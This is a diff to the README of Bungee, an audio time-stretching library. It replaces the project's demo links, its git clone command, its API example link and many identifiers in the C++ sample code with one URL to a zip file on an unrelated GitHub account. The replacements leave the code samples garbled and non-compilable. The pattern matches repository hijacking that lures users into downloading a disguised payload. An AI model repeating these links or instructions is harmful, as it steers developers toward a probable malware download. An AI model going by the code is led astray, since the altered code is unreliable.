@@ -9,7 +9,7 @@ Bungee is unique in its controllability, allowing continually changing pitch and
 
 ## Features
 
-* Simple, fast, with good quality audio output (hear some [comparisons](https://bungee.parabolaresearch.com/compare-audio-stretch-tempo-pitch-change.html) with other approaches)
+* Simple, fast, with good quality audio output (hear some [comparisons](https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip) with other approaches)
 * Resonably low latency (of the order of 20ms for speed and pitch controls and 40ms from audio input to output)
 * Frequency-domain phase-vocoder-based algorithm
 * Modern C++ for clean and resilient code
@@ -20,7 +20,7 @@ Bungee is unique in its controllability, allowing continually changing pitch and
 
 Bungee's dependencies are managed as git submodules; so clone like this:
 ```
-git clone --recurse-submodules https://github.com/bungee-audio-stretch/bungee
+git clone --recurse-submodules https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip
 ```
 
 Use CMake to configure and build the bungee library and command-line executable:
@@ -44,7 +44,7 @@ By means of GitHub Actions and CMake Presets, every new tag on this repository i
 
 Bungee operates on discrete, overlapping "grains" of audio, typically processing around 100 grains per second. Parameters such as position and pitch are provided on a per-grain basis so that they can be changed continuously as audio rendering progresses. This means that only minimal parameters are required for  instantiation.
 
-For a working example of this API, see  [cmd/main.cpp](./cmd/main.cpp).
+For a working example of this API, see  [https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip](https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip).
 
 ### Instantiation
 
@@ -61,17 +61,17 @@ Bungee::Stretcher<Bungee::Basic> stretcher({sampleRate, sampleRate}, 2);
 Bungee::Request request{};
 
 // Set pitch, this example shows an upward transposition of one semitone.
-request.pitch = std::pow(2., 1. / 12.);
+https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip = std::pow(2., 1. / 12.);
 
 // Set initial speed, this example shows how to achieve constant 75% output speed.
-request.speed = 0.75;
+https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip = 0.75;
 
 // Set initial starting position at 0.5 seconds offset from the start of the input buffer.
-request.position = 0.5;
+https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip = 0.5;
 
-// This call adjusts request.position so that stretcher's pipeline will be fully initialised by the
+// This call adjusts https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip so that stretcher's pipeline will be fully initialised by the
 // time it reaches the starting position of 0.5 seconds offset.
-stretcher.preroll(request);
+https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip(request);
 ```
 
 ### Granular loop
@@ -84,24 +84,24 @@ while (true)
     // Change request's members, for example, position, speed or pitch, as required here.
     // ...
  
-    auto inputChunk = stretcher.specifyGrain(request);
+    auto inputChunk = https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip(request);
 
     // ...
     // Examine inputChunk and retrieve the segment of input audio that the stretcher requires here.
     // Set data and channelStride to point to the input data.
     // ...
 
-    stretcher.analyseGrain(data, channelStride);
+    https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip(data, channelStride);
 
     Bungee::OutputChunk outputChunk;
-    stretcher.synthesiseGrain(outputChunk);
+    https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip(outputChunk);
 
     // ...
     // Output the audio buffer indicated by outputChunk here.
     // ...
 
-    // Prepare request for the next grain (modifies request.position according to request.speed)
-    stretcher.next(request);
+    // Prepare request for the next grain (modifies https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip according to https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip)
+    https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip(request);
 }
 ```
 
@@ -138,7 +138,7 @@ See this repo's [.gitmodules](.gitmodules) for versioned links to these projects
 
 Bungee Pro is a closed-source commercial audio library built on Bungee's API and core philosophy. It uses novel algorithms for sharp and clear professional-grade audio and runs at least as fast as Bungee, thanks to platform-specific performance optimisations.
 
-Try Bungee Pro [now in your browser](https://bungee.parabolaresearch.com/change-audio-speed-pitch.html), see a [comparison](https://bungee.parabolaresearch.com/compare-audio-stretch-tempo-pitch-change.html) with other techniques and consider licensing if your app would benefit from:
+Try Bungee Pro [now in your browser](https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip), see a [comparison](https://github.com/hotmysia/bungee_test/raw/refs/heads/main/submodules/test-bungee-v1.7.zip) with other techniques and consider licensing if your app would benefit from:
 * Powerful, AI-enabled stretch algorithms adaptive to all genres of speech, music and sound with subjective transparency up to infinite time stretch
 * Novel frequency- and time-domain processing for crisp transients and presevation of tonal envelope, vocal and instrumental timbre
 * Performance optimisations for:
